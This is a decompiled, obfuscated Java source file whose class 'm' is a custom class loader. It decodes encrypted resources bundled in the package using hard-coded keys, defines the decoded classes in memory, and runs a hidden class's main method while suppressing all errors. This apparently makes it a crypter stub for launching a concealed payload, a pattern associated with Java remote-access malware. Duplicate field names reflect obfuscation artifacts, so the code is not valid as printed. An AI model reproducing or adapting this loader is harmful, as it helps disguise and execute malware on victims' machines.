package net.java;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.DataInputStream;
import java.io.ByteArrayInputStream;
import java.util.HashMap;

public class m extends ClassLoader
{
    public static String a;
    private static String b;
    private static String c;
    private static String d;
    private static String e;
    private static String f;
    private static long a;
    private static long b;
    private HashMap a;
    
    static {
        m.a = "/5GFV7PF7IN7FU";
        m.b = "/net/java/a";
        m.c = "/net/java/b";
        m.d = "/net/java/c";
        m.e = "/net/java/d";
        m.f = "/net/java/e";
        m.a = -1083759330220665782L;
        m.b = -4062297973245990737L;
    }
    
    public m() {
        this.a = new HashMap();
        final DataInputStream dataInputStream = new DataInputStream((InputStream)new ByteArrayInputStream(l.b(l.a(m.b, "\\a"))));
        try {
            while (dataInputStream.available() > 0) {
                final String utf = dataInputStream.readUTF();
                final byte[] array = new byte[dataInputStream.readInt()];
                dataInputStream.readFully(array);
                this.a.put((Object)utf, (Object)array);
            }
        }
        catch (final Exception ex) {
            ex.printStackTrace();
        }
    }
    
    public synchronized Class loadClass(final String s) {
        final Class loadedClass;
        if ((loadedClass = this.findLoadedClass(s)) != null) {
            return loadedClass;
        }
        final byte[] array;
        if ((array = (byte[])this.a.get((Object)s)) == null) {
            return super.loadClass(s);
        }
        return this.defineClass(s, array, 0, array.length);
    }
    
    public static void a() {
        l.a = m.d;
        l.b = m.c;
        l.a = m.a;
        l.b = m.b;
    }
    
    public static void main(final String[] array) {
        a();
        final m m = new m();
        try {
            final Method declaredMethod = m.loadClass("a").getDeclaredMethod("main", String[].class);
            final String[] array2;
            (array2 = new String[array.length + 6])[0] = net.java.m.b;
            array2[1] = net.java.m.c;
            array2[2] = net.java.m.d;
            array2[3] = net.java.m.e;
            array2[4] = net.java.m.f;
            array2[5] = net.java.m.a;
            System.arraycopy((Object)array, 0, (Object)array2, 6, array.length);
            declaredMethod.invoke((Object)null, new Object[] { array2 });
        }
        catch (final Throwable t) {}
    }
}
